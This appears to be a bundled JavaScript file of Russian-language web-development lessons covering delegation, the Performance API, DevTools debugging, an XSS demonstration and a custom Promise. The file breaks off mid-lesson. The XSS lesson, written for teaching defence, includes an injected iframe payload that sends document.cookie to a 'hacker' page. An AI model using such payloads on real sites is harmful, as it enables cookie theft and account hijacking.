Джонсон и Джон Влиссидес\n[%%%Gang of Four%%%](http://www.sugardas.lt/~p2d/books/Priemioop.pdf)\n![](https://i.pinimg.com/originals/0b/c7/f0/0bc7f0c5ab814da316948fd2c9dd39aa.jpg)\nВ их книге **Design Patterns: Elements of Reusable Object-Oriented Software** ( 1995 ) описаны 23 паттерна в ООП\n@@@@\n_____________________________________________________\n\n## ![ico-25 icon] Поведенческие паттерны\n\nК числу поведенческих паттернов относится уже знакомый нам **итератор**\n\nКакую проблему общего порядка решает этот паттерн ?\n\nВо-первых, он обеспечивает механизм последовательного доступа к элементам структуры данных\nВо-вторых, итератор работает с \"черным ящиком\" - снаружи не видно, что именно он итерирует, до тех пор, пока не будут выполнены все итерации\nВ-третьих, итератор опосредует доступ к структуре данных, задавая строгий порядок операций с ее элементами\n\nНаконец, структура данных может и не быть структурой данных - это может быть цепочка неких операций, вызовов функций и т.д.\n\n_____________________________________________________\n\n## ![ico-25 icon] Делегирование\n\nВ прототипной модели наследования, по-сути, отсутствует сам механизм наследования, поскольку он подменяется механизмом **делегирования**\n\nДействительно, что такое прототип ? - это объект, отличный от того объекта, прототипом которого он является\n\nДавайте создадим два объекта: **proto** и **media**\n\nи сделаем объект **proto** прототипом объекта **media**\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst proto = {\n  showPicture () {\n    document.body\n      .appendChild(document.createElement('img'))\n      .src = 'https://cdn.pixabay.com/photo/2014/04/04/10/51/darling-harbour-313216_960_720.jpg'\n  }\n}\n\nconst media = {\n  sayHello () {\n    document.body\n      .appendChild(document.createElement('h3'))\n      .innerText = 'Hello!'\n  }\n}\n\nObject.setPrototypeOf(media, proto)\n~~~\n\nЕсли теперь мы вызовем метод **_showPicture_** объекта **media**:\n\n~~~js\nmedia.showPicture()\n~~~\n\nто, по-сути, мы делегируем объекту **proto** то, что не может сделать объект **media**,\nпоскольку у него нет такого метода\n\nПоэтому вся цепочка прототипов является, по-сути, цепочкой делегирования, а не наследования\n\nЕсли рассматиривать делегирование как паттерн проектирования в ООП, то можно привести и другие примеры\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst media = {\n  image: true,\n  method () {\n    document.body\n      .appendChild(document.createElement('img'))\n      .src = 'https://garevna.github.io/js-samples/images/js-ico.png'\n  }\n}\n\nconst speaker = {\n  text: true,\n  method () {\n    document.body\n      .appendChild(document.createElement('h3'))\n      .innerText = 'Hello'\n  }\n}\n\nconst dispetcher = {\n  workers: [speaker, media],\n  getSignal (signal) {\n    const worker = this.workers.find(worker => worker[signal])\n    worker && worker.method()\n  }\n}\n~~~\n\n{{{pattern-1.js}}}\n\n^^Преимущества делегирования (прототипного наследования) по сравнению с классической моделью наследования отлично показаны^^ [^^Henry Lieberman^^](http://web.media.mit.edu/~lieber/Lieberary/OOP/Delegation/Delegation.html)\n\n_____________________________________________________\n"},47642:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Performance\n\nДля оценки производительности приложения можно использовать встроенный в браузеры интерфейс **performance**\n\nЭтот интерфейс обеспечивает доступ к следующим API:\n^^• **Performance Timeline API**^^\n^^• **High Resolution Time API**^^\n^^• **Navigation Timing API**^^\n^^• **User Timing API**^^\n^^• **Resource Timing API**^^\n\n^^Если в консоли любой веб-страницы вывести объект **performance**, то можно увидеть примерно следующее:^^\n\n^^^[performance]\n\n~~~console\n▼ Performance {timeOrigin: 1546006432906.767, onresourcetimingbufferfull: null, memory: MemoryInfo, navigation: PerformanceNavigation, timing: PerformanceTiming}\n  ▼ memory: MemoryInfo\n        jsHeapSizeLimit: 2217857988\n        totalJSHeapSize: 33243136\n        usedJSHeapSize: 19358120\n      ► __proto__: MemoryInfo\n  ► navigation: PerformanceNavigation {type: 0, redirectCount: 0}\n    onresourcetimingbufferfull: null\n    timeOrigin: 1546006432906.767\n  ▼ timing: PerformanceTiming\n        connectEnd: 1546006433378\n        connectStart: 1546006432960\n        domComplete: 1546006435228\n        domContentLoadedEventEnd: 1546006434216\n        domContentLoadedEventStart: 1546006434216\n        domInteractive: 1546006434216\n        domLoading: 1546006433576\n        domainLookupEnd: 1546006432960\n        domainLookupStart: 1546006432915\n        fetchStart: 1546006432910\n        loadEventEnd: 1546006435231\n        loadEventStart: 1546006435228\n        navigationStart: 1546006432906\n        redirectEnd: 0\n        redirectStart: 0\n        requestStart: 1546006433379\n        responseEnd: 1546006433563\n        responseStart: 1546006433534\n        secureConnectionStart: 1546006433015\n        unloadEventEnd: 0\n        unloadEventStart: 0\n      ► __proto__: PerformanceTiming\n  ► __proto__: Performance\n~~~\n\n^^^\n\n^^При запуске страницы браузер создает объект **~performance~**, содержащий все временные характеристики процессов загрузки ресурсов и отрисовки страницы с использованием _времени высокой точности_ ( **UTC** )^^\n^^( измеренное в миллисекундах с полуночи 1 января 1970 года )^^\n\n^^Скрипт может получать данные ( ~getEntries()~, ~getEntriesByName()~, ~getEntriesByType()~ ) из этого буфера,^^\n^^а так же динамически создавать и удалять кастомные временные метки ( ~mark~ ) и измерения ( ~measure~ )^^\n\n_____________________________________________\n\n## ![ico-25 icon] performance.timing\n\n**^^Загрузка документа^^**\n\n| **document.readyState**                                                                                                     | **performance.timing** |\n| **~loading~** ^^( документ в процессе загрузки )^^                                                                          | **~domLoading~**         |\n| **~interactive~** ^^( документ загружен и распарсен, но подключаемые ресурсы - стили, картинки и т.д. - еще загружаются )^^ | **~domInteractive~**     |\n| **~complete~** ^^( документ полностью готов - инициируется событие load )^^                                                 | **~domComplete~**        |\n\n~~~js\nconst { domComplete, domInteractive, domLoading } = performance.timing\n\nconsole.log(domComplete - domInteractive)\nconsole.log(domInteractive - domLoading)\n~~~\n\n_____________________________________________________\n\n## ![ico-25 icon] Унаследованные методы performance\n\n^^^[Performance.prototype]\n\n~~~console\n▼ Performance {now: ƒ, getEntries: ƒ, getEntriesByType: ƒ, …}\n  ► clearMarks: ƒ clearMarks()\n  ► clearMeasures: ƒ clearMeasures()\n  ► clearResourceTimings: ƒ clearResourceTimings()\n  ► getEntries: ƒ getEntries()\n  ► getEntriesByName: ƒ getEntriesByName()\n  ► getEntriesByType: ƒ getEntriesByType()\n  ► mark: ƒ mark()\n  ► measure: ƒ measure()\n    memory: (...)\n    navigation: (...)\n  ► now: ƒ now()\n    onresourcetimingbufferfull: (...)\n  ► setResourceTimingBufferSize: ƒ setResourceTimingBufferSize()\n    timeOrigin: (...)\n    timing: (...)\n  ► toJSON: ƒ toJSON()\n  ► constructor: ƒ Performance()\n    Symbol(Symbol.toStringTag): "Performance"\n  ► get memory: ƒ memory()\n  ► get navigation: ƒ navigation()\n  ► get onresourcetimingbufferfull: ƒ onresourcetimingbufferfull()\n  ► set onresourcetimingbufferfull: ƒ onresourcetimingbufferfull()\n  ► get timeOrigin: ƒ timeOrigin()\n  ► get timing: ƒ timing()\n  ► __proto__: EventTarget\n~~~\n\n^^^\n\n_______________________________________________________________\n\n### ![ico-20 icon] now\n\nМетод ~performance.now()~ позволяет получить текущее время высокой точности с момента начала отсчета\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconsole.log(`Старт: ${performance.now()}`)\nsetTimeout(() => console.log(`Стоп: ${performance.now()}`), 2000)\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\nСтарт: 207385.50000003306\nСтоп: 209385.9999999986\n~~~\n\nТаким образом, точное время, которое прошло с момента первого вызова ~performance.now()~ до второго вызова этого метода, составляет\n\n~~~console\n209385.9999999986 - 207385.50000003306 = 2000.499999965541 (ms)\n~~~\n\n_______________________________________________________________\n\n### ![ico-20 icon] mark\n\nУстановка временных меток\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nperformance.mark(\'start\')\n\nfor (let x = 0; x < 1000; x++) document.write(`${x}<br/>`)\n\nperformance.mark(\'end\')\n\nconst items = window.performance.getEntriesByType(\'mark\')\n\nconsole.log(items)\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n▼ (2) [PerformanceMark, PerformanceMark]\n  ▼ 0: PerformanceMark\n        duration: 0\n        entryType: "mark"\n        name: "start"\n        startTime: 2677.5999999954365\n      ► __proto__: PerformanceMark\n  ▼ 1: PerformanceMark\n        duration: 0\n        entryType: "mark"\n        name: "end"\n        startTime: 2725.9000000049127\n      ► __proto__: PerformanceMark\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n_______________________________________________________________\n\n### ![ico-20 icon] measure\n\nИзмерение производительности\n\n◘◘![ico-20 cap] ** 3**◘◘ \n\n~~~js\nperformance.mark(\'start1\')\n\nconst elem = document.body\n  .appendChild(document.createElement(\'img\'))\n\nelem.src = \'http://ogo.ua/images/articles/1567/big/1395958980.jpg\'\nelem.width = 200\n\nperformance.mark(\'end1\')\n\nperformance.measure(\'insertElement\', \'start1\', \'end1\')\n\nperformance.mark(\'start2\')\n\ndocument.body.innerHTML += `\n  <img src="http://ogo.ua/images/articles/1567/big/1395958980.jpg" width="200" />\n`\n\nperformance.mark(\'end2\')\n\nperformance.measure(\'insertElement\', \'start2\', \'end2\')\n\nconst measures = performance.getEntriesByName(\'insertElement\')\n\nconsole.log(`1: duration: ${measures[0].duration}ms`)\nconsole.log(`2: duration: ${measures[1].duration}ms`)\n\nperformance.clearMarks()\nperformance.clearMeasures()\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n1: duration: 0.20000000949949026ms\n2: duration: 0.20000000949949026ms\n~~~\n\nОбратите внимание на методы\n\n• clearMarks()\n• clearMeasures()\n\n_______________________________________________________________\n\n### ![ico-20 icon] Entries\n\n• getEntries()\n• getEntriesByName()\n• getEntriesByType()\n\nС помощью этих методов можно получить массив объектов\n\nКаждый такой объект имеет свойства **~entryType~** и **~name~**\n\nВозможные значения этих свойств:\n\n| entryType | name |\n| **resource** | URL запрошенного ресурса |\n| **mark** | имя метки, созданной с помощью **performance.mark** |\n| **measure** | имя, использованное при вызове **performance.measure()** |\n| **paint** | либо **first-paint**, либо **first-contentful-paint** |\n| **frame**, **navigation** | URL документа |\n\n_______________________________________________________________\n\n#### ![ico-20 icon] getEntries\n\nЭтот метод вернет все объекты\n\n• PerformanceResourceTiming\n• PerformancePaintTiming\n• PerformanceMark\n• PerformanceMeasure\n\nхранящие данные о временных характеристиках процессов, связанных:\n• с получением ресурсов: экземпляр **~PerformanceResourceTiming~**\n• с отрисовкой страницы: экземпляр **~PerformancePaintTiming~**\n\nа так же:\n• с маркерами, установленными с помощью метода **~performance.mark()~**: экземпляр **~PerformanceMark~**\n• измерениями, созданными с помощью метода **~performance.measure()~**: экземпляр **~PerformanceMeasure~**\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nperformance.mark(\'start\')\n\nconst elem = document.body\n  .appendChild(document.createElement(\'img\'))\n\nelem.src = \'http://ogo.ua/images/articles/1567/big/1395958980.jpg\'\nelem.width = 200\n\nperformance.mark(\'end\')\n\nconsole.log(performance.getEntries())\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n▼ (2) [PerformanceMark, PerformanceMark]\n  ▼ 0: PerformanceMark\n        duration: 0\n        entryType: "mark"\n        name: "start"\n        startTime: 3348.8999999826774\n      ► __proto__: PerformanceMark\n  ▼ 1: PerformanceMark\n        duration: 0\n        entryType: "mark"\n        name: "end"\n        startTime: 3349.099999992177\n      ► __proto__: PerformanceMark\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\nperformance.mark(\'start\')\n\nfetch(\'https://httpbin.org\')\n  .then(() => {\n    performance.mark(\'end\')\n    performance.measure(\'fetchDuration\', \'start\', \'end\')\n    console.log(performance.getEntries())\n  })\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ (4) [PerformanceMark, PerformanceMeasure, PerformanceResourceTiming, PerformanceMark]\n  ▼ 0: PerformanceMark\n        duration: 0\n        entryType: "mark"\n        name: "start"\n        startTime: 2684.400000027381\n      ► __proto__: PerformanceMark\n  ▼ 1: PerformanceMeasure\n        duration: 453.5999999498017\n        entryType: "measure"\n        name: "fetchDuration"\n        startTime: 2684.400000027381\n      ► __proto__: PerformanceMeasure\n  ▼ 2: PerformanceResourceTiming\n        connectEnd: 0\n        connectStart: 0\n        decodedBodySize: 0\n        domainLookupEnd: 0\n        domainLookupStart: 0\n        duration: 452.70000002346933\n        encodedBodySize: 0\n        entryType: "resource"\n        fetchStart: 2684.5999999786727\n        initiatorType: "fetch"\n        name: "https://httpbin.org/"\n        nextHopProtocol: "http/1.1"\n        redirectEnd: 0\n        redirectStart: 0\n        requestStart: 0\n        responseEnd: 3137.300000002142\n        responseStart: 0\n        secureConnectionStart: 0\n      ► serverTiming: []\n        startTime: 2684.5999999786727\n        transferSize: 0\n        workerStart: 0\n      ► __proto__: PerformanceResourceTiming\n  ▼ 3: PerformanceMark\n        duration: 0\n        entryType: "mark"\n        name: "end"\n        startTime: 3137.9999999771826\n      ► __proto__: PerformanceMark\n    length: 4\n  ► __proto__: Array(0)\n~~~\n\n^^^\n\n_______________________________________________________________\n\n#### ![ico-20 icon] getEntriesByName\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nperformance.mark(\'start\')\n\nfetch(\'https://httpbin.org\')\n  .then(() => {\n    performance.mark(\'end\')\n    performance.measure(\'fetchDuration\', \'start\', \'end\')\n    console.log(performance.getEntriesByName(\'https://httpbin.org/\'))\n  })\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ [ PerformanceResourceTiming ]\n  ▼ 0: PerformanceResourceTiming\n        connectEnd: 0\n        connectStart: 0\n        decodedBodySize: 0\n        domainLookupEnd: 0\n        domainLookupStart: 0\n        duration: 146.99999999720603\n        encodedBodySize: 0\n        entryType: "resource"\n        fetchStart: 6048.500000033528\n        initiatorType: "fetch"\n        name: "https://httpbin.org/"\n        nextHopProtocol: "http/1.1"\n        redirectEnd: 0\n        redirectStart: 0\n        requestStart: 0\n        responseEnd: 6195.500000030734\n        responseStart: 0\n        secureConnectionStart: 0\n      ► serverTiming: []\n        startTime: 6048.500000033528\n        transferSize: 0\n        workerStart: 0\n      ► __proto__: PerformanceMark\n    length: 1\n  ► __proto__: Array(0)\n~~~\n\n^^^\n\n_______________________________________________________________\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst pictures = [\n  \'http://ogo.ua/images/articles/1567/big/1395958980.jpg\',\n  \'https://wxpcdn.gcdn.co/dcont/fb/image/crew3_1024.png\',\n  \'https://mixpix.in/post_imgs/2015/04/10/141025/00009.jpg\',\n  \'https://mixpix.in/post_imgs/2015/04/10/141025/00006.jpg\'\n]\npictures\n  .forEach(item => {\n    performance.mark(\'start\')\n\n    const elem = document.body\n      .appendChild(document.createElement(\'img\'))\n    elem.src = item\n    elem.width = 200\n\n    performance.mark(\'end\')\n  })\n\nconsole.log(performance.getEntriesByName(\'start\'))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n▼ (4) [PerformanceMark, PerformanceMark, PerformanceMark, PerformanceMark]\n  ► 0: PerformanceMark {name: "start", entryType: "mark", startTime: 2465.700000000652, duration: 0}\n  ► 1: PerformanceMark {name: "start", entryType: "mark", startTime: 2467.000000004191, duration: 0}\n  ► 2: PerformanceMark {name: "start", entryType: "mark", startTime: 2467.1000000089407, duration: 0}\n  ► 3: PerformanceMark {name: "start", entryType: "mark", startTime: 2467.30000001844, duration: 0}\n    length: 4\n  ► __proto__: Array(0)\n~~~\n\n_______________________________________________________________\n\n#### ![ico-20 icon] getEntriesByType\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\nconsole.log(performance.getEntriesByType(\'resource\'))\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ [PerformanceResourceTiming]\n  ▼ 0: PerformanceResourceTiming\n        connectEnd: 0\n        connectStart: 0\n        decodedBodySize: 0\n        domainLookupEnd: 0\n        domainLookupStart: 0\n        duration: 1.400000008288771\n        encodedBodySize: 0\n        entryType: "resource"\n        fetchStart: 19113.49999997765\n        initiatorType: "img"\n        name: "http://ogo.ua/images/articles/1567/big/1395958980.jpg"\n        nextHopProtocol: "h2"\n        redirectEnd: 0\n        redirectStart: 0\n        requestStart: 0\n        responseEnd: 19114.899999985937\n        responseStart: 0\n        secureConnectionStart: 0\n      ► serverTiming: []\n        startTime: 19113.49999997765\n        transferSize: 0\n        workerStart: 0\n      ► __proto__: PerformanceResourceTiming\n        length: 1\n  ► __proto__: Array(0)\n~~~\n\n^^^\n\n_______________________________________________________________\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\nfetch(\'https://httpbin.org/\')\n  .then(response => console.log(performance.getEntriesByType(\'resource\')))\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ [PerformanceResourceTiming]\n  ▼ 0: PerformanceResourceTiming\n        connectEnd: 0\n        connectStart: 0\n        decodedBodySize: 0\n        domainLookupEnd: 0\n        domainLookupStart: 0\n        duration: 144.70000000437722\n        encodedBodySize: 0\n        entryType: "resource"\n        fetchStart: 24782.19999995781\n        initiatorType: "fetch"\n        name: "https://httpbin.org/"\n        nextHopProtocol: "http/1.1"\n        redirectEnd: 0\n        redirectStart: 0\n        requestStart: 0\n        responseEnd: 24926.89999996219\n        responseStart: 0\n        secureConnectionStart: 0\n      ► serverTiming: []\n        startTime: 24782.19999995781\n        transferSize: 0\n        workerStart: 0\n      ► __proto__: PerformanceResourceTiming\n        length: 1\n  ► __proto__: Array(0)\n~~~\n\n^^^\n\n_______________________________________________________________\n\n### ![ico-20 icon] PerformanceResourceTiming\n\nДля каждого процесса загрузки ресурсов приложения создается свой экземпляр **~PerformanceResourceTiming~**\n\n#### ![ico-20 icon] initiatorType\n\nСвойство **_~initiatorType~_** этого экземпляра идентифицирует источник запроса\n\n| **link**           | Запрос инициирован элементом &lt;link>   |\n| **script**         | Запрос инициирован элементом &lt;script> |\n| **img**            | Запрос инициирован элементом &lt;img>    |\n| **css**            | Запрос инициирован элементом &lt;style><br>( например, при загрузке шрифтов ) |\n| **xmlhttprequest** | Запрос инициирован объектом XMLHttpRequest |\n\n#### ![ico-20 icon] name\n\nСвойство **_~name~_** этого экземпляра идентифицирует **~url~** запрошенного ресурса\n\n◘◘![ico-20 cap] **10**◘◘\n\n~~~js\nconst pictures = [\n  \'http://ogo.ua/images/articles/1567/big/1395958980.jpg\',\n  \'https://wxpcdn.gcdn.co/dcont/fb/image/crew3_1024.png\',\n  \'https://mixpix.in/post_imgs/2015/04/10/141025/00009.jpg\',\n  \'https://mixpix.in/post_imgs/2015/04/10/141025/00006.jpg\'\n]\n\nconst promises = []\n\npictures\n  .forEach(item => promises.push(new Promise(function (resolve, reject) {\n    const elem = document.createElement(\'img\')\n\n    elem.onload = function (event) {\n      const res = performance.getEntriesByName(event.target.src)\n      resolve({\n        name: res[0].name,\n        duration: res[0].duration\n      })\n    }\n\n    elem.onerror = event => reject(event.target.src)\n\n    elem.src = item\n  })))\n\nPromise.all(promises)\n  .then(result => {\n    result\n      .forEach(item => document.body.innerHTML += `<img src="${item.name}" width="120"/><br/><small>${item.duration} (ms)</small><br/>`)\n  })\n  .catch(file => console.error(`Error loading file: ${file}`))\n~~~\n\n______________________________________________________________________\n\n**Результат на странице:**\n\n________________________________\n\n@@@@\n\n<img src="http://ogo.ua/images/articles/1567/big/1395958980.jpg" width="120"/>\n&nbsp;\n^^2.3999999975785613 (ms)^^\n&nbsp;\n<img src="https://wxpcdn.gcdn.co/dcont/fb/image/crew3_1024.png" width="120"/>\n&nbsp;\n^^7.400000002235174 (ms)^^\n&nbsp;\n<img src="https://mixpix.in/post_imgs/2015/04/10/141025/00009.jpg" width="120"/>\n&nbsp;\n^^2.5000000023283064 (ms)^^\n&nbsp;\n<img src="https://mixpix.in/post_imgs/2015/04/10/141025/00006.jpg" width="120"/>\n&nbsp;\n^^2.900000021327287 (ms)^^\n&nbsp;\n\n@@@@\n\n_______________________________________________________________\n\n## ![ico-25 icon] Memory allocation\n\n[![ico-70 youtube]](https://www.youtube.com/watch?v=nDNEiu_xwf0&feature=youtu.be)'},74409:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-30 hw] Задание\n\nПерейдите по [![ico-20 link] **ссылке**](https://garevna.github.io/js-samples/#05)\n\nОткройте **~Chrome DevTools~** (вкладка **~Sources~**)\n\nВ панели навигации откройте папку ![ico-20 dir] **js**\n\nпереключитесь на файл ![ico-20 file] **index05.js**\n\nВ панели отображения кода найдите функцию  **getCurrentPostComments**\n\nУстановите точку останова (~breakpoint~)  на первой строке кода функции (_строка 74_)\n\nПерезагрузите страницу (**~F5~**)\n\nТеперь выполнение кода будет остановлено в нужной точке до того, как функция завершит работу\n\nОтредактируйте код функции   **getCurrentPostComments**   таким образом, чтобы она возвращала массив комментариев к посту, идентификатор которого передается аргументом функции  **postId**\n\n~~~js\ngetCurrentPostComments(postId)\n~~~\n\nСохраните внесенные изменения (_~Ctrl + S~_)\n\nУстановите наблюдение за переменными, используемыми в коде функции (**~Watch~**)\n\nЗапустите пошаговое выполнение кода, отслеживая, как меняются значения переменных\n\nРезультат работы функции **getCurrentPostComments**:\n\n![](createPath(\"images\",'practice-03.png'))\n"},96171:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] XSS\n\nXSS (Cross-Site Scripting — «межсайтовый скриптинг») — атака на веб-систему путем инъекции вредоносного кода\n^^(вместо "C" используется "X", чтобы не было путаницы с CSS)^^\n\nВнедренный код будет выполняться на компьютере пользователя.\nКод может пересылать конфиденциальные данные  пользователя  веб-серверу хакера.\n\nРазновидностей XSS-атак очень много.\nЧастично они отражаются на уровне браузера.\nВ данном примере мы  будем внедрять код при вводе пользовательских данных\nи использовать обработчиков событий элементов для запуска внедренного кода.\n\n[![ico-20 link] Перейдите по ссылке](samples/03).\n\nОткройте **~Chrome DevTools~**.\n\n![](illustrations/xss-atack.png)\n\nУстановите точки останова (~breakpoints~) для того, чтобы пошагово отслеживать выполнение кода и вносить изменения в код.\n\n1. Скопируйте код ниже и вставьте его в поле ввода элемента ~input~:\n\n~~~html\n&lt;IMG SRC="images/hack.png"\n     onerror="document.write(String.fromCharCode(88, 83, 83))"/>\n~~~\n\nэто довольно безобидная "атака", которая просто перезапишет содержимое ~body~\n\n2. Посмотрите на содержимое куки страницы до вставки вредоносного кода в поле input:\n\n![](illustrations/xss-atack-cookie.png)\n\nСкопируйте код ниже и вставьте его в поле ввода элемента ~input~:\n\n~~~html\n&lt;IFRAME SRC=js/attack.html\n  onmouseover="window.open(\'https://garevna.github.io/js-samples/js/attack.html#\' + document.cookie, \'_self\')">\n</IFRAME>\n~~~\n\nНа страницу будет вставлен фрейм, в котором будет открыта страница хакера, которой будут переданы данные, хранящиеся в cookie.\n\nПри наведении курсора на этот фрейм будет происходить переход на страницу хакера.\n\n^^с помощью такой строки можно украсть cookie с компьютера пользователя, где хранится конфиденциальная информация о нем.^^\n\n\n## ![ico-25 hw] Задание\n\nВ панели навигации откройте файл **~js/index03.js~**.\n\nУстановите breakpoints.\n\n![](illustrations/xss-atack-breakpoints.png)\n\nИзмените по своему усмотрению содержимое куки.\n\nИзмените код функции валидации ввода пользователя (**~testUserText~**).\n\nВ случае XSS атаки функция должна заменить текст, введенный пользователем, на сообщение: "_XSS атака отражена_" с указанием текущей даты и времени.\n\nСохраните изменения и продолжите выполение кода.\n\n__________________________________________________________\n\n[![ico-20 link] XSS](https://owasp.org/www-community/attacks/xss/)\n[![ico-20 link] websitesecurity](https://www.acunetix.com/websitesecurity/cross-site-scripting/)\n'},18484:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] Конструктор Promise\n\nДля более глубокого понимания того, как работает конструктор Promise,\nмы можем напилить собственный код, который будет делать практически то же самое\n\nПоскольку колбэки промиса являются микротасками, мы будем использовать **MutationObserver**\n\nДля этого вспомним, что это такое\n\n### ![ico-20 icon] MutationObserver\n\nЭкземпляр **~MutationObserver~** отслеживает изменения элементов DOM\n\nСоздать такой экземпляр легко с помощью конструктора **~MutationObserver~**:\n\n~~~js\nconst observer = new MutationObserver(function (mutations) {\n  ...\n})\n~~~\n\nВ качестве аргумента конструктору **~MutationObserver~** передается колбэк-функция, \nкоторая станет микротаском при наступлении события мутации отслеживаемого элемента DOM\n\nИтак, созданный объект **observer** унаследовал метод **~observe~**,\nс помощью которого мы можем установить наблюдение за мутациями любого элемента DOM:\n\n~~~js\nobserver.observe(element, options)\n~~~\n\nОбъект ~options~ содержит инфо для обозревателя, что именно отслеживать при мутациях данного элемента\nМожно ослеживать добавление / удаление потомков, мутации текстового содержимого элемента и т.д.\n\nМы будем отслеживать добавление или удаление дочерних элементов, \nвключая текстовые узлы (text nodes) \nс помощью такой конфигурации: \n\n~~~js\nconst config = { childList: true }\n~~~\n\nТеперь осталось определить элементы, мутации которых мы будем отслеживать\n\n_______________________________________________________________\n\n### ![ico-20 icon] resolve | reject\n\nДело в том, что при создании промиса функция, которая передается конструктору **Promise**, должна быть исполнена сразу\nНо в теле функции происходит вызов колбэков **~resolve~** | **~reject~**,\nкоторые еще не определены на момент создания экземпляра **Promise**\nи являются формальными параметрами этой функции\n\nПоэтому при вызове этой функции в конструкторе **CustomPromise**\nмы передадим этой функции собственные колбэки,\nкоторые будут получать результат или ошибку и сохранять в каких-то переменных...\n\nОднако переменные не отслеживаются экзумпляром **observer** - \nон может отслеживать только мутации элементов DOM\n\nПоэтому поместим ответ, который вернет функция, в элементы-контейнеры\n**~this.response~** и **~this.error~**:\n\n~~~js\nfunc(response => this.response.textContent = JSON.stringify(response), error => this.error.textContent = JSON.stringify(error))\n~~~\n\nа затем установим наблюдение за мутациями этих элементов:\n\n~~~js\nthis.observer.observe(this.response, config)\nthis.observer.observe(this.error, config)\n~~~\n\nКонечно, эти элементы-контейнеры нужно создать, и сделать невидимыми\nДля этого мы создадим унаследованный метод нашего конструктора **CustomPromise**:\n\n~~~js\nCustomPromise.prototype.createContainer = function (containerName) {\n  this[containerName] = document.body\n    .appendChild(document.createElement('pre'))\n  Object.assign(this[containerName], {\n    id: containerName,\n    style: 'visibility: hidden',\n    textContent: ''\n  })\n}\n~~~\n\nНам остается только вызвать это метод в конструкторе, чтобы создать нужные элементы-контейнеры:\n\n~~~js\nthis.createContainer('response')\nthis.createContainer('error')\n~~~\n\n_____________________________________________________________________\n\n### ![ico-20 icon] Кастомный конструктор\n\n\n◘◘CustomPromise◘◘ \n\n~~~js\nfunction CustomPromise (func) {\n  const config = { childList: true }\n\n  this.resolve = null\n  this.reject = null\n\n  this.createContainer('response')\n  this.createContainer('error')\n  this.createContainer('callbacks')\n\n  this.observer = this.getObserver()\n\n  this.observer.observe(this.response, config)\n  this.observer.observe(this.error, config)\n  this.observer.observe(this.callbacks, config)\n\n  this.then = function (resolve, reject) {\n    this.resolve = resolve\n    this.reject = reject\n    this.callbacks.text = 'set'\n  }\n\n  func(response => this.response.textContent = JSON.stringify(response), error => this.error.textContent = JSON.stringify(error))\n}\n\nCustomPromise.prototype.createContainer = function (containerName) {\n  this[containerName]  = document.body.appendChild(document.createElement('pre'))\n  this[containerName].id = containerName\n  this[containerName].style.visibility = 'hidden'\n  this[containerName].textContent = ''\n}\n\nCustomPromise.prototype.getObserver = function () {\n  const self = this\n  return new MutationObserver(function (mutations) {\n    error && error.textContent && self.reject\n      ? self.reject(error.textContent)\n      : response && response.textContent && self.resolve\n        ? self.resolve(response.textContent)\n        : null\n  })\n}\n~~~\n\n_____________________________________________________________\n\n### ![ico-20 icon] Пример использования\n\nТеперь используем конструктор **CustomPromise** для создания промиса:\n\n~~~js\nconst user = { name: 'Stephan', age: 25, hobby: 'football' }\nconst errorCode = Math.round(Math.random() * 599)\nconst time = Math.random() * 5000\n\nconst promise = new CustomPromise((resolve, reject) => setTimeout(() => Math.random() > 0.5 ? resolve(user) : reject(errorCode), time))\n~~~\n\nи передадим колбэки:\n\n~~~js\npromise\n  .then(response => document.write(response), error => document.write('Error ' + error))\n~~~\n\n{{{promise.js}}}\n\n________________________________________________\n\n[%%%Тесты%%%](https://garevna.github.io/js-quiz/#promise)\n"},83018:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Promise\n\n__________________________________________________________________________________________\n\n[►►►callback►►►](page/Event-Loop#Callback)\n\n__________________________________________________________________________________________\n\n## ![ico-30 icon] Конструктор\n\nКонструктор **~Promise~** является **функцией высшего порядка**.\nЭто означает, что в качестве **обязательного аргумента** конструктор **~Promise~** ожидает **функцию**.\n\n~~~js\nconst promise = new Promise(function (...) {\n  ...\n})\n~~~\n\nЕсли вызвать конструктор **~Promise~** без аргумента:\n\n~~~js\nconst promise = new Promise ()\n~~~\n\n![ico-20 err] будет сгенерировано исключение\n\n~~~error\n    Uncaught TypeError: Promise resolver undefined is not a function\n~~~\n\n__________________________________________________________________________________________\n\n### ![ico-25 icon] Функция-аргумент\n\nФункция-аргумент конструктора **~Promise~** также является **функцией высшего порядка**, т.е. ее формальные параметры - это **функции**.\n^^Более того, ее формальные параметры - это функции обратного вызова.^^\n\nФункция-аргумент будет вызвана в момент создания экземпляра **~Promise~**.\nПопробуем передать конструктору **~Promise~** функцию без формальных параметров:\n\n~~~js\nconsole.log('Start')\n\nnew Promise(() => console.log('Promise starts'))\n\nconsole.log('End')\n~~~\n\nКак мы видим, конструктор **~Promise~** вызвал переданную ему анонимную функцию.\n\n~~~console\nStart\nPromise starts\nEnd\n~~~\n\nИтак, мы передали конструктору **~Promise~** некую функцию, а он ее вызвал.\nПока никакой асинхронщины.\n\n_____________________________________\n\n### ![ico-25 icon] Экземпляр\n\nДавайте 